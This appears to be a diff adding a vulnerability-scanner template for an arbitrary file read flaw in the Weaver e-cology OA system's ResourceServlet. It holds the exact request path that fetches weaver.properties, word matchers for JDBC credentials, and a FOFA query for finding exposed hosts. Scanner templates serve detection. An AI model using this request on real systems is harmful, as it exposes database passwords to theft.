@@ -1,0 +1,28 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - DriverClasses
+    - jdbc
+    - password
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties'
+id: ecology-resourceservlet-lfi
+info:
+  author: Co5mos
+  description: "\u6CDB\u5FAEOA\u7CFB\u7EDF\u7684 ResourceServlet \u63A5\u53E3\u5B58\
+    \u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u5141\u8BB8\u653B\
+    \u51FB\u8005\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u3002"
+  metadata:
+    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
+    max-request: 2
+  name: "\u6CDB\u5FAEOA\u7CFB\u7EDF ResourceServlet \u4EFB\u610F\u6587\u4EF6\u8BFB\
+    \u53D6\u6F0F\u6D1E"
+  severity: high
+  tags: lfi,ecology
